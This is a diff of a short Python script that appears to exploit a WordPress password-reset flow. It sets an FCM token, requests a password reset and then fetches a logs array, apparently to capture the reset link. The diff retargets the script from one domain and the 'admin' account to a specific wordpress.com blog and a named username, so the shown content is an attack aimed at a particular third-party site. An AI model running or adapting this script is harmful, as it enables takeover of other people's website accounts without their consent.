@@ -1,6 +1,6 @@
 import requests
 
-url = "https://www.courtlaw.com/" # Change this
+url = "https://lola509.wordpress.com/" # Change this
 
 # set fcm token
 print("Setting the FCM Token")
@@ -15,7 +15,7 @@ print("Attempting password reset")
 
 request_url = f"{url}/wp-login.php?action=lostpassword"
 request_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": f"{url}", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Referer": f"{url}/wp-login.php?action=lostpassword", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
-request_data = {"user_login": "admin", "redirect_to": '', "wp-submit": "Get New Password"}
+request_data = {"user_login": "vitalzenggeru3", "redirect_to": '', "wp-submit": "Get New Password"}
 requests.post(request_url, headers=request_headers, data=request_data)
 
 # get logs array
